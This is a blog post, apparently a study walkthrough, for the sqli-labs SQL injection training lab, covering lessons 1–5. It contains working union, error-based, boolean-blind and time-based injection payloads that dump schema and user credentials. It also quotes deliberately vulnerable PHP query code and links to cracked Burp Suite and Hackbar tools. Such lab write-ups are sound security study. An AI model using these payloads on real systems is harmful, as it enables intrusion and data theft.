<!DOCTYPE html>
<html lang="zh-CN">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF" />
  <meta name="author" content="slug01sh" />
  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。" />
  
  
  <title>
    
      sqli-labs(全通关刷题笔记) 
      
      
      |
    
     slug01sh
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-WTRCMZDFLE');
    </script>
  

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="slug01sh" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Oranges</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">sqli-labs(全通关刷题笔记)</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2021-01-11 12:27:47
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="分类"></i>
                
                <span class="span--category">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/" title="网络空间安全">
                    <b>#</b> 网络空间安全
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1 准备工作"></a>1 准备工作</h1><p>国光师傅太强了，准备写 sqli-labs 的博客，发现国光师傅已经写过了。不过俺的思路还是有一些不同之处。</p>
<ul>
<li>Sqli-labs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/skyblueee/sqli-labs-php7%E3%80%82">https://github.com/skyblueee/sqli-labs-php7。</a><blockquote>
<p>通常下载 Sqli-labs 时，会下载到最初的那个 sqli-labs，但是并不适用于PHP7。</p>
</blockquote>
</li>
<li>Burp Suite 下载地址：<a target="_blank" rel="noopener" href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li>
<li>Hackbar 下载地址：<a target="_blank" rel="noopener" href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li>
<li>Navicat：可以用来写 SQL 语句，有自动补全功能。</li>
</ul>
<p>我使用VScode来运行 sql-labs，国光师傅使用的是 Docker 安装。对于我这种菜鸡，还是先采用复杂的方法吧。</p>
<h1 id="2-基础挑战-1-20"><a href="#2-基础挑战-1-20" class="headerlink" title="2 基础挑战(1-20)"></a>2 基础挑战(1-20)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>闭合方式是非常关键的一步，能正确的闭合 SQL 语句，SQL 注入工作结束一半。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1       # 可以看到登陆的用户名和密码</span><br><span class="line">?id&#x3D;1&#39;      # SQL报错（1&#39;&#39; LIMIT 0,1），并且可以看到部分 SQL 语句（说明存在 SQL 注入）。报错显示 SQL 语句中使用两个单引号导致错误（传参引入的单引号+原来的 SQL 语句中原有的单引号），可以在传参引入的单引号后添加注释符来注释后面那个单引号）。</span><br><span class="line">?id&#x3D;1&#39;#     # 报错。原因：在URL中GET可能作为锚点,无法传到后端。所以该用--+，--+的传入后端url解码后是-- （注意空格），当然也可以采用%23（手动url编码）</span><br><span class="line">?id&#x3D;1&#39;%23   # 正常回显</span><br><span class="line">?id&#x3D;1&#39;--+   # 正常回显（SELECT * FROM users WHERE id&#x3D;&#39;1&#39; --+&#39; LIMIT 0,1）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果需要分析 SQL 注入的 SQL 变化，可以考虑修改源码来观察 SQL 语句。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/77218F39-FAF6-4918-A148-1FA5C031B27B.png"><br>这里有个值得思考的测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1%23 # SQL语句：SELECT * FROM users WHERE id=&#x27;1#&#x27; LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>按照正常思路，应该什么也查不到才对，结果却能正常查询id=1。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114162823.png"><br>我们可以考虑在 Navicat 中进行测试，确定这种查询真实存在。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E4F6DD5A-3000-4D14-BFC8-20E3F2ACEE6E.png"></p>
<p>上面这两种查询的结果都是一样的，非常奇怪吧？</p>
<p>和PHP的弱类型一样，MySQL也有弱类型，在闭合 SQL 语句时是会经常用到的。具体可以参考下面这片文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/HaHa_Sir/article/details/93666147">MySQL 字符串类型用数字可以查出来 MySQL字符串类型会转换成数字 MySQL隐式类型转换</a>。</p>
<p>开始搜集数据库中的数据，常见的信息搜集有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">system_user()     系统用户名</span><br><span class="line">user()            MYSQL用户名 </span><br><span class="line">current_user()    当前用户名</span><br><span class="line">session_user()    连接数据库的用户名</span><br><span class="line">database()        当前数据库名</span><br><span class="line">schema()          当前数据库名</span><br><span class="line">version()         当前数据库版本信息</span><br><span class="line">@@version</span><br><span class="line">load_file()       MYSQL读取本地文件</span><br><span class="line"></span><br><span class="line">@@datadir         Location of DB files</span><br><span class="line">@@hostname        服务器主机名</span><br><span class="line">@@basedir         MYSQL 安装路径</span><br><span class="line">@@version_compile_os    操作系统</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的测试一下常见的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">?id&#x3D;0&#39; union select 1, database(), 3%23</span><br><span class="line"></span><br><span class="line"># 查询数据库版本</span><br><span class="line">?id&#x3D;0&#39; union select 1, version(), 3%23</span><br><span class="line"></span><br><span class="line"># 查询数据库用户</span><br><span class="line">?id&#x3D;0&#39; union select 1, user(), 3%23</span><br><span class="line"></span><br><span class="line">#数据库路径</span><br><span class="line">?id&#x3D;0&#39; union select 1, @@datadir, 3%23</span><br><span class="line"></span><br><span class="line"># 操作系统版本</span><br><span class="line">?id&#x3D;0&#39; union select 1, @@version_compile_os, 3%23</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line"># SELECT GROUP_CONCAT(schema_name) FROM information_schema.SCHEMATA</span><br><span class="line">id&#x3D;0&#39; union select 1, 2, group_concat(schema_name) from information_schema.schemata%23</span><br><span class="line"></span><br><span class="line"># 查询某个数据库的数据表名</span><br><span class="line"># SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;DATABASE()</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+ # hex编码</span><br><span class="line"></span><br><span class="line"># 查询某个数据库的某个表的字段名</span><br><span class="line"># SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;</span><br><span class="line">?id&#x3D;0&#39; union SELECT 1, 2, GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br><span class="line"></span><br><span class="line"># 查询数据表的数据</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(id, username, password) from users --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要更进一步的学习手工注入，可以参考这片文章:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/160352.html">新手科普 | MySQL手工注入之基本注入流程</a></p>
<hr>
<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>闭合方式：<code>id=$id</code></p>
<p>和上一题主要是闭合方式不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1       # 正常显示</span><br><span class="line">?id&#x3D;1 --+   # 正常显示</span><br><span class="line">?id&#x3D;1&#39;      # 正常显示</span><br><span class="line">?id&#x3D;1&#39; --+  # 错误（并没有看到引号，故该题的闭合方式是数字型）</span><br><span class="line">?id&#x3D;0 union select 1,2, 3 --+       # 回显2，3。说明显示第2个字段和第3个字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和 less-1 的区别：闭合方式。less-1 是字符类型，有单引号包裹。less-2 是 int 类型，不需要单引号。其他注入获取信息的姿势是一样的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;</span><br><span class="line"># 报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line"># 在SQL语句中有小括号（可以在本地先进行测试）。考虑将括号进行闭合</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;) --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;) and 1&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;) and 1&#x3D;0 --+</span><br><span class="line"># 没有数据</span><br><span class="line"></span><br><span class="line">?id&#x3D;0&#39;) and 1&#x3D;1 union select 1,2, 3 --+</span><br><span class="line"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>简单分析：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 本题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">&#x27;$id&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 前两题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 前三个都只是闭合的方式不同</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br><span class="line"># 依然有括号，尝试闭合括号</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;) --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;) and 1&#x3D;1 --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;) and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;0&quot;) and 1&#x3D;0 union select 1, 2, 3 --+</span><br><span class="line"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>简单分析：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 本题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">&quot;$id&quot;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 前三题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">&#x27;$id&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭合方式不同</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>前面 4 个 lession 都是最基本的注入姿势，并且是能够查询得到返回结果的。按照<code>回显方式</code>来分类的话，我认为可以分为 5 类：</p>
<ul>
<li>联合注入</li>
<li>报错注入</li>
<li>布尔注入</li>
<li>延时注入</li>
<li>其他（DNSlog）</li>
</ul>
<p>注意：这里仅按照回显方式分类。很难做到完全 MECE 原则（Mutually Exclusive, Collectively Exhaustive / 相互独立、完全穷尽），通常按照下面的优先原则进行：</p>
<blockquote>
<p>联合注入&gt;报错注入&gt;布尔注入&gt;延时注入&gt;其他（DNSlog）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line"># s You are in...........</span><br><span class="line"># 没有用户信息。只能考虑报错注入、布尔注入、时间盲注。</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &quot;1&quot; LIMIT 0,1&#39; at line 1</span><br><span class="line"># 闭合单引号</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;0&#39; and 1&#x3D;0 union select 1, 2, 3 --+</span><br><span class="line">#  You are in...........，无法得到数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>根据上面的优先级，我们考虑先报错注入开始测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id&#x3D;0&#39; and 1&#x3D;0 union select updatexml(1,concat(0x7e,(select @@version),0x7e),1); --+</span><br><span class="line"># s XPATH syntax error: &#39;~8.0.19~&#39;</span><br><span class="line"># 将 select @@version 进行修改即可查询其他的数据。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>原理：MySQL在执行SQL语句时，某些函数会将子查询的结果显示在报错信息中。更多的报错注入参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.322c525cGjiCkg&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn#toc-1">先知社区-MYSQL报错注入的一点总结</a></p>
<hr>
<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>尝试使用<strong>布尔注入</strong>进行测试，布尔注入会稍微比较复杂，不过基本原理不算复杂。</p>
<blockquote>
<p>基本原理：用true与false去一点点确定信息，汇总之后就能得到整个数据库的信息。如：</p>
<ul>
<li>问：数据库名长度大于8？</li>
<li>答：false</li>
<li>问：数据库名长度小于8？</li>
<li>答：false（可以确定数据库的长度为8）</li>
<li>问：数据库第一个首字母是s？</li>
<li>答：是</li>
</ul>
</blockquote>
<p>简单验证是否能进行布尔注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用页面内容的显示和不显示，来判断我们查询的内容是什么。将我们想要查询的内容进行拆分，然后逐个判断。例如：想要知道数据库名，我们可以先询问系统：“第一个字符是不是a？”，如果不是，就继续询问是否为b，直到问出结果。然后再去寻找第二个字符。</p>
<p>常用的函数：</p>
<ul>
<li>substr(string string,num start,num length);<br>string为字符串；start为起始位置；length为长度。（mysql中的start是从1开始的）</li>
<li>left()(str,length);str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;a&quot;  --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;s&quot;  --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 8)&#x3D;&quot;security&quot;  --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 8)&#x3D;0x7365637572697479  --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br></pre></td></tr></table></figure>
我们将中间的database()，替换成其他的SQL语句就可以查询其他的结果了。</li>
</ul>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>时间盲注通常在看不到任何回显信息的时候尝试，时间盲注是在布尔注入的基础上的。布尔注入是利用网站自带的回显，而时间注入则是将 true 和 false 转化为不同的等待时间。直接修改上面的 Payload 可得：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(substr(database(), 1, 8)&#x3D;0x7365637572697479, sleep(5), 1)  --+</span><br><span class="line"># 有明显的延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单分析：<br>这个 lession 和前面的不同点在于回显方式。这个 lession 并不会像先前一样，显示并返回查询到的信息，而是告诉你是否正确。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysqli_query($con1, $sql);</span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;    </span><br><span class="line">      <span class="comment">// 关键语句</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>闭合方式:<code>id=&quot;$id&quot;</code></p>
<p>测试闭合方式：</p>
